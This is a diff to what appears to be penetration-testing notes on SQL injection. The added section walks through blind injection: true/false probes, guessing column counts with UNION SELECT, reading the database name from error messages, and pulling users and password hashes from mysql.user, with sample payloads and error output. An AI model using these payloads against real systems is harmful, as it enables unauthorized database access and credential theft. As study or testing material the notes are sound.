@@ -74,5 +74,26 @@ Tricks to read data
 
     Exfiltrate the different rows of the table:
         *' or 'x'='x' order by 1 desc --
-        ' or 'x'='x' order by 2 desc --
-        ...*
+' or 'x'='x' order by 2 desc --
+...*
+
+
+Generic blind SQLI exploitation
+    First, identify vulnerable parameter by causing true and false conditions:
+    *or 1=1 vs or 1=2
+    and 1=2 vs and 1=1*
+    If the query is a select, the true should return all rows of the table and the other empty results.
+    Next step is to gess the number of columns, you can do that by sending an union statement, you will get an error until you guess it:
+    *id=1 union all select 1
+    id=1 union all select 1,2
+    id=1 union all select 1,2,3
+    ...*
+    You can get the name of the database by sending:
+    *?id=1 union all select 1,2,3,4,5 from XXX
+ Table 'gallery.XXX' doesn't existCould not select category*
+ You can use a comment *#* to finish the query, in case there is a group by after the context of the injection. You can select the users and passwords form the database with:
+ *id=1+union+all+(select+1,2,3,4,5,6+from+mysql.user)%23*
+
+ Leak the password:
+ *1+union+(select+password,2,3,4,5,6+from+mysql.user)%23
+ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*47FB3B1E573D80F44CD198DC65DE7764795F948E) order by dateuploaded desc limit 1' at line 1*
